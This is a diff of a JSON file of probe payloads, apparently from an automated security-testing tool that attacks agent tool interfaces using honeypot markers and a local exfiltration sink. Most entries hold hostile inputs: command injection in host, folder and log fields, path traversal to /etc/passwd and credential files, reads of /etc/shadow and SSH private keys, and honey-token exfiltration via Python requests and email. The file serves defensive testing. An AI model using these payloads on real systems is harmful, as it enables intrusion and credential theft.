@@ -1,109 +1,378 @@
 {
-  "07c08e6d7182ee2c": {
+  "1ca35c271d98fced": {
     "purpose": "runtime-attack",
     "response": {
       "probes": [
         {
           "arguments": {
-            "host": "; echo MTMXb48bb55f$((4053*2900))"
+            "log_type": "portscan"
           },
-          "rationale": "Probing for command execution vulnerability",
+          "rationale": "Check for any honey markers or secrets in port scan logs.",
+          "tool": "view_network_logs"
+        }
+      ]
+    }
+  },
+  "22335e8ffb6648c6": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "keyword": "private_key"
+          },
+          "rationale": "Probe for files containing 'private_key' to identify potential private key leaks.",
+          "tool": "search_files"
+        },
+        {
+          "arguments": {
+            "filename": "../private/credentials.txt"
+          },
+          "rationale": "Attempt to read 'private/credentials.txt' using traversal, inferred from secret_paths.",
+          "tool": "read_file"
+        }
+      ]
+    }
+  },
+  "3af8231faeae0e89": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "filename": "Private/system_credentials.txt"
+          },
+          "rationale": "Attempt to read the file 'Private/system_credentials.txt' identified in the previous search to check for unauthorized access to private files.",
+          "tool": "read_file"
+        }
+      ]
+    }
+  },
+  "53496c198336ca47": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "log_path": "/honey/private/credentials.txt"
+          },
+          "rationale": "Attempt to read a potentially sensitive file in a private directory to check for unauthorized access.",
+          "tool": "analyze_log_file"
+        },
+        {
+          "arguments": {
+            "command": "cat ~/.ssh/id_rsa; echo MTMX7482b354$((2149*6702))"
+          },
+          "rationale": "Attempt to read a sensitive SSH private key file to check for unauthorized access.",
+          "tool": "execute_shell_command"
+        },
+        {
+          "arguments": {
+            "code": "import requests; requests.post('http://127.0.0.1:{port}/exfil', data={'secret': 'sk-MTMHONEY-TOKEN-ac08aaf64f50'})"
+          },
+          "rationale": "Attempt to exfiltrate a honey secret to the sink URL to check for unauthorized data egress.",
+          "tool": "execute_python_code"
+        }
+      ]
+    }
+  },
+  "62ad672cfffdf5f0": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "log_path": "/honey/secrets.txt"
+          },
+          "rationale": "Attempt to read a potential secret file within the declared root to check for sensitive data exposure.",
+          "tool": "analyze_log_file"
+        }
+      ]
+    }
+  },
+  "83c99f2a7bf8de2d": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "filename": "../Private/system_credentials.txt"
+          },
+          "rationale": "Attempt to read 'Private/system_credentials.txt' using directory traversal to bypass access restrictions.",
+          "tool": "read_file"
+        },
+        {
+          "arguments": {
+            "keyword": "api_key"
+          },
+          "rationale": "Search for files containing 'api_key' to identify potential locations of sensitive information.",
+          "tool": "search_files"
+        }
+      ]
+    }
+  },
+  "98ef4e62e6b37f51": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "log_type": "diagnostic"
+          },
+          "rationale": "Check if network diagnostics logs contain honey markers or secrets.",
+          "tool": "view_network_logs"
+        }
+      ]
+    }
+  },
+  "b2143aa51f21d447": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "log_path": "/proc/self/environ"
+          },
+          "rationale": "Probe for environment variables that might contain sensitive information.",
+          "tool": "analyze_log_file"
+        },
+        {
+          "arguments": {
+            "command": "cat /etc/shadow; echo MTMX7482b354$((2149*6702))"
+          },
+          "rationale": "Attempt to read the shadow file and confirm command execution with payload.",
+          "tool": "execute_shell_command"
+        },
+        {
+          "arguments": {
+            "code": "import os; os.system('echo MTMX7482b354$((2149*6702))')"
+          },
+          "rationale": "Test for shell command execution via Python code.",
+          "tool": "execute_python_code"
+        }
+      ]
+    }
+  },
+  "b4dc15d3862bbe46": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "log_type": "traceroute"
+          },
+          "rationale": "Check for honey marker leakage in traceroute logs to identify potential context leaks.",
+          "tool": "view_network_logs"
+        }
+      ]
+    }
+  },
+  "b71b6bb1a7622eb3": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "folder": "../private/credentials.txt"
+          },
+          "rationale": "Attempt to read a sensitive file in a private directory using path traversal.",
+          "tool": "check_email"
+        },
+        {
+          "arguments": {
+            "body": "http://127.0.0.1:{port}/exfil",
+            "subject": "Test",
+            "to": "exfil@example.com"
+          },
+          "rationale": "Test for egress by sending the sink URL in the email body.",
+          "tool": "send_email"
+        },
+        {
+          "arguments": {
+            "log_type": "access; echo MTMX400d4fcd$((7823*2546))"
+          },
+          "rationale": "Attempt command execution by injecting a command into the log_type argument.",
+          "tool": "view_system_logs"
+        }
+      ]
+    }
+  },
+  "c0536768c381b503": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "folder": "inbox; echo MTMX400d4fcd$((7823*2546))"
+          },
+          "rationale": "Attempt to execute a command via folder name injection to test for command execution vulnerability.",
+          "tool": "check_email"
+        },
+        {
+          "arguments": {
+            "body": "sk-MTMHONEY-TOKEN-e904e99bf224",
+            "subject": "Test",
+            "to": "exfil@example.com"
+          },
+          "rationale": "Send the honey secret to test for unauthorized exfiltration via email.",
+          "tool": "send_email"
+        },
+        {
+          "arguments": {
+            "service_id": "epro_api_5f4e3d2c1b0a9z8y7x"
+          },
+          "rationale": "Use the leaked API key to check if it can access service status, indicating a boundary violation.",
+          "tool": "check_service_status"
+        },
+        {
+          "arguments": {
+            "log_type": "system"
+          },
+          "rationale": "Check system logs for any honey markers or leaked information.",
+          "tool": "view_system_logs"
+        }
+      ]
+    }
+  },
+  "cf09a9c0a2413681": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "folder": "../private"
+          },
+          "rationale": "Attempt directory traversal to access potentially sensitive email folders.",
+          "tool": "check_email"
+        },
+        {
+          "arguments": {
+            "body": "MTMHONEY-CANARY-da2914cb8992",
+            "subject": "Test",
+            "to": "exfil@example.com"
+          },
+          "rationale": "Check for unauthorized email exfiltration by sending a honey marker.",
+          "tool": "send_email"
+        },
+        {
+          "arguments": {
+            "service_id": "MTMHONEY-CANARY-da2914cb8992"
+          },
+          "rationale": "Test for reflection or leakage of honey markers in service status checks.",
+          "tool": "check_service_status"
+        },
+        {
+          "arguments": {
+            "log_type": "error; echo MTMX400d4fcd$((7823*2546))"
+          },
+          "rationale": "Inject command to test for unauthorized command execution in log viewing.",
+          "tool": "view_system_logs"
+        }
+      ]
+    }
+  },
+  "ebb7bf371bec9ec7": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "folder": "../private/secrets.txt"
+          },
+          "rationale": "Attempt to access a potentially sensitive file in a private directory to check for unauthorized file access.",
+          "tool": "check_email"
+        }
+      ]
+    }
+  },
+  "ed0d8726996a297c": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "command": "echo MTMX7482b354$((2149*6702))"
+          },
+          "rationale": "Test for command execution by checking if the payload is executed and its result is reflected.",
+          "tool": "execute_shell_command"
+        },
+        {
+          "arguments": {
+            "log_path": "/etc/passwd"
+          },
+          "rationale": "Attempt to read a known sensitive file to check for unauthorized file access.",
+          "tool": "analyze_log_file"
+        },
+        {
+          "arguments": {
+            "code": "print('MTMHONEY-CANARY-88c767e3a06f')"
+          },
+          "rationale": "Check if the Python code execution reflects the honey marker, indicating a context leak.",
+          "tool": "execute_python_code"
+        }
+      ]
+    }
+  },
+  "efc6cb815bccc452": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "filename": "../etc/passwd"
+          },
+          "rationale": "Attempt to read a sensitive file outside the declared root to test for path traversal vulnerability.",
+          "tool": "read_file"
+        },
+        {
+          "arguments": {
+            "keyword": "password"
+          },
+          "rationale": "Search for files containing the keyword 'password' to identify potential locations of sensitive information.",
+          "tool": "search_files"
+        }
+      ]
+    }
+  },
+  "fd72c886e0babe75": {
+    "purpose": "runtime-attack",
+    "response": {
+      "probes": [
+        {
+          "arguments": {
+            "host": "127.0.0.1; echo MTMXb48bb55f$((4053*2900))"
+          },
+          "rationale": "Inject command to test for command execution vulnerability.",
           "tool": "ping_host"
         },
         {
           "arguments": {
-            "host": "MTMHONEY-CANARY-506a30297da8"
+            "host": "http://127.0.0.1:80/exfil"
           },
-          "rationale": "Probing for context leak/vulnerality in traceroute",
+          "rationale": "Use sink URL to test for unauthorized egress.",
           "tool": "traceroute"
         },
         {
           "arguments": {
-            "host": "MTMHONEY-CANARY-506a30297da8",
+            "host": "http://127.0.0.1:80/exfil",
             "port": 80
           },
-          "rationale": "Checking for honeypot exposure during port scan",
+          "rationale": "Check if sink URL is reachable, indicating potential egress.",
           "tool": "port_scan"
         },
         {
           "arguments": {
-            "options": "none",
-            "target": "MTMHONEY-CANARY-506a30297da8"
+            "target": "127.0.0.1; echo MTMXb48bb55f$((4053*2900))"
           },
-          "rationale": "Inspecting network diagnostic for canary leaks",
+          "rationale": "Inject command to test for command execution vulnerability.",
           "tool": "network_diagnostic"
         },
         {
           "arguments": {
             "log_type": "ping"
           },
-          "rationale": "Viewing logs for any signs of secret markers indicating unauthorized exposure",
+          "rationale": "Check for honey marker reflection in logs.",
           "tool": "view_network_logs"
-        }
-      ]
-    }
-  },
-  "92ef12afd02c79e3": {
-    "purpose": "runtime-attack",
-    "response": {
-      "probes": [
-        {
-          "arguments": {
-            "code": "import os; os.system('echo MTMX7482b354$((2149*6702))')"
-          },
-          "rationale": "Check if Python code execution allows shell command execution.",
-          "tool": "execute_python_code"
-        },
-        {
-          "arguments": {
-            "command": "echo MTMX7482b354$((2149*6702))"
-          },
-          "rationale": "Test for potential command execution to confirm execution within a shell.",
-          "tool": "execute_shell_command"
-        },
-        {
-          "arguments": {
-            "log_path": ".env"
-          },
-          "rationale": "Attempt to read a common secret file to verify access and path traversal potentiality.",
-          "tool": "analyze_log_file"
-        }
-      ]
-    }
-  },
-  "9681504b50298195": {
-    "purpose": "runtime-attack",
-    "response": {
-      "probes": [
-        {
-          "arguments": {
-            "folder": "../../etc"
-          },
-          "rationale": "Attempt path traversal to access unauthorized directories like /etc.",
-          "tool": "check_email"
-        },
-        {
-          "arguments": {
-            "body": "This is a test email with a honey secret: sk-MTMHONEY-TOKEN-e904e99bf224",
-            "subject": "Test",
-            "to": "recipient@example.com"
-          },
-          "rationale": "Send a honey secret in the email body to check if secrets are leaking through email sending.",
-          "tool": "send_email"
-        },
-        {
-          "arguments": {
-            "service_id": "email_service; echo MTMX400d4fcd$((7823*2546))"
-          },
-          "rationale": "Inject an execution payload to test for command execution vulnerabilities.",
-          "tool": "check_service_status"
-        },
-        {
-          "arguments": {
-            "log_type": "access; cat /etc/passwd"
-          },
-          "rationale": "Attempt command injection to access unauthorized files through log_type argument.",
-          "tool": "view_system_logs"
         }
       ]
     }
